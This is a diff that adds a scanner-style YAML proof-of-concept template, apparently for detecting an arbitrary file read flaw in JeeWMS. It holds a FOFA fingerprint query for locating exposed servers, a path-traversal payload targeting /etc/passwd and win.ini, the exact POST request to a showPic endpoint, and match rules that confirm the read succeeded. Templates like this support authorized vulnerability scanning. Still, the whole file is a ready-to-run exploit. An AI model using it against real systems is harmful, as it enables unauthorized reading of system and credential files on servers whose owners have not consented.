@@ -1,0 +1,33 @@
+id: poc-yaml-jeewms-wmsapicontroller-do-anyfile-read
+info:
+  name: JeeWMS wmsApiController.do 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: JEEWMS
+  fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
+variables:
+  paths: "../../../../../../../../../../etc/passwd\n../../../../../../../../../../c:/Windows/win.ini\
+    \ \n"
+requests:
+- method: POST
+  path: /wmsApiController.do/../cgformTemplateController.do?showPic=11
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: code=../../../../&path={{.paths}}
+  expression: '(status_code == 200 && !contains(body,"<"))
+
+    &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin") && contains(content_type,`image//etc/passwd`))
+
+    ||
+
+    (contains(body,"[files]") && contains(body,"[fonts]"))
+
+    )
+
+    '
+transport: http
